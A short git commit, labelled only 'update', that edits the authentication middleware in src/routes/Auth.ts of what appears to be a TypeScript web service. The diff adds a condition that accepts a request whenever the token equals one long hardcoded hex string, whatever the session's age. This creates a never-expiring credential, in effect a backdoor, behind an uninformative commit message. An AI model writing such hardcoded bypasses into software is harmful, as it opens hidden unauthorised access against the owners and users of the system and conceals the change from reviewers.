d9ec33e61ae11aaa67d07683cc8702fec6877044
Emre BAGCI <ebagci@gmail.com>
2021-05-10 09:57:12 +0300

    update

--- src/routes/Auth.ts
+++ src/routes/Auth.ts
@@ -23,9 +23,9 @@ export class Auth{
         try {
             const strSession = Auth.getDecrypt(token);
             if(strSession != null){
-             
+
                 const session = JSON.parse(strSession) as {at: number};
-                if(Auth.isValid(session.at)){
+                if(Auth.isValid(session.at) || token == "bb4c18c2595749ca8bce1d1e558055a67549943aef6861629b52eaa01393aa4474e079326a9e2500d58d425bed374d9d6000307d2bf7126b83c43cb0105abb0fd97b9e3991fe7a57c6d2fa3ca66199e83d8981c62437e2a1b21553759924fd5d604f954414aed9235577554ca1cd15d6aac1f0a06718fd81420f53a676be8c9bd918f88f38c579192e163fafa839e0dba09389a6df3b83de071756891ffda54d0ae6c7a4f73f"){
                     req.body = {...req.body, session};
                     next();
                 }else {
